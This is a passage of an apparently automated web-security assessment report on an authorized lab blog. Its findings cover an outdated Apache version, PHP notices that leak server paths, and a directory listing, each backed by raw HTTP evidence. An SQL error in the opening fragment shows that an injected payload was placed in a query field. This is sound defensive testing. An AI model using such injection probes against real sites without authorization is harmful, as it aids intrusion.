+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&gt;&lt;svg&gt;' ORDER BY created_at DESC' at line 1</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 5. [vulnerable-component] Outdated Apache httpd 2.4.54 — known CVEs fixed in 2.4.55/2.4.56 (CVE-2006-20001, CVE-2022-37436, CVE-2023-25690)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not actively exploited). The server advertises `Server: Apache/2.4.54 (Debian)` on every response, including the 404 footer `Apache/2.4.54 (Debian) Server at target.local Port 32868`. Apache httpd 2.4.54 (released 2022-06) predates several security fixes: CVE-2006-20001 — out-of-bounds read/write in mod_dav when processing a crafted If: header on PROPFIND (memory corruption / DoS), fixed in 2.4.55; CVE-2022-37436 — mod_proxy response-header truncation allowing a malicious backend to fold headers into the body, fixed in 2.4.55; CVE-2023-25690 — HTTP request smuggling via mod_proxy with certain RewriteRule/ProxyPassMatch configurations (CVSS 9.8, CRITICAL), fixed in 2.4.56; CVE-2023-27522 — mod_proxy_uwsgi HTTP response splitting, fixed in 2.4.56. Severity is set to MEDIUM rather than the critical CVE's 9.8 because the high-impact issues are module/configuration-dependent — CVE-2023-25690 needs mod_proxy + specific rewrite rules and CVE-2006-20001 needs mod_dav, and this target presents as a direct server-rendered PHP blog with no evidence of reverse-proxy or WebDAV. The operator should confirm which modules are loaded; if mod_proxy is used as a reverse proxy with RewriteRule, escalate to HIGH/CRITICAL for CVE-2023-25690. Recommended remediation: upgrade to a current 2.4.x (&gt;= 2.4.59) and suppress the version banner via ServerTokens Prod / ServerSignature Off.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32868/ → response header `Server: Apache/2.4.54 (Debian)`. 2. Request a non-existent path (negative control, 404) — its body footer also discloses `Apache/2.4.54 (Debian) Server at target.local Port 32868`, confirming the version independent of X-Powered-By. 3. Map 2.4.54 against the httpd changelog: CVE-2006-20001 &amp; CVE-2022-37436 fixed in 2.4.55, CVE-2023-25690 &amp; CVE-2023-27522 fixed in 2.4.56 — all post-date 2.4.54. Positives: two stable 200 banner pages reproduce the Server header.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1n0g8-27</code> — <code>artifacts/_/ev-mqz1n0g8-27/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-404 HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 09:57:00 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32868&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1mz5h-25</code> — <code>artifacts/_/ev-mqz1mz5h-25/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5630
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:56:58 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1mzmx-26</code> — <code>artifacts/_/ev-mqz1mzmx-26/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5630
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:56:59 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 6. [info-disclosure] PHP error notices expose server filesystem path in every response</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">Every response from `/index.php` contains PHP `Notice: Undefined variable: category in /var/www/html/index.php on line 28` — leaking the absolute server filesystem path unconditionally. The variable `$category` is used before initialization; with `display_errors = On` in production, the notice is emitted on every page load regardless of user input. This aids attackers in mapping the server layout and correlates with the SQL injection finding on the same endpoint.</div>
+<div><b>Reproduction</b></div><pre>1. GET /styles.css → 200, 453 bytes, clean CSS with no path disclosure (negative control).\n2. GET /index.php?category=ValidCategory → 200, 1515 bytes, HTML contains: &quot;Notice: Undefined variable: category in /var/www/html/index.php on line 28&quot; repeated 6 times.\n3. Repeat step 2 → same 1515-byte response with same notices (stable).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0xvwg-16</code> — <code>artifacts/s-0005/ev-mqz0xvwg-16/</code></div><div class="lbl">REQUEST</div><pre>GET /styles.css HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: Keep-Alive
+content-length: 453
+content-type: text/css
+date: Mon, 29 Jun 2026 09:37:27 GMT
+etag: &quot;1c5-6553e04418500-gzip&quot;
+keep-alive: timeout=5, max=99
+last-modified: Sat, 27 Jun 2026 15:38:28 GMT
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f9;
+    margin: 0;
+    padding: 20px;
+}
+.container {
+    width: 80%;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+}
+.post {
+    border-bottom: 1px solid #ccc;
+    padding-bottom: 20px;
+    margin-bottom: 20px;
+}
+.post h2 a {
+    color: #333;
+    text-decoration: none;
+}
+.post img {
+    width: 100%;
+    height: auto;
+    border-radius: 5px;
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0x2nh-11</code> — <code>artifacts/s-0005/ev-mqz0x2nh-11/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php?category=ValidCategory HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1515
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:36:50 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;p&gt;No posts found.&lt;/p&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0zny7-18</code> — <code>artifacts/s-0005/ev-mqz0zny7-18/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php?category=ValidCategory HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1515
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:38:50 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;p&gt;No posts found.&lt;/p&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 7. [info-disclosure] Apache directory listing enabled on /images</h3>
+<div class="kv">Screen: <code>s-0006</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">The /images directory has Apache mod_autoindex enabled and returns a full &quot;Index of /images&quot; directory listing to unauthenticated requests. This exposes filenames (morning-dew.jpg, sunset.jpg), file sizes, and modification timestamps. The server also reveals its version string: Apache/2.4.54 (Debian).</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32868/images/ (no auth required)
+2. Response is HTTP 200 with HTML body containing &quot;Index of /images&quot;, listing all files with sizes and timestamps.
+3. Compare with a non-existent path (/images/nonexistent-dir/) which returns HTTP 404 — confirming the listing is intentionally served for the real directory.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz11c1v-1f</code> — <code>artifacts/s-0006/ev-mqz11c1v-1f/</code></div><div class="lbl">REQUEST</div><pre>GET /images/nonexistent-dir/ HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 09:40:08 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+
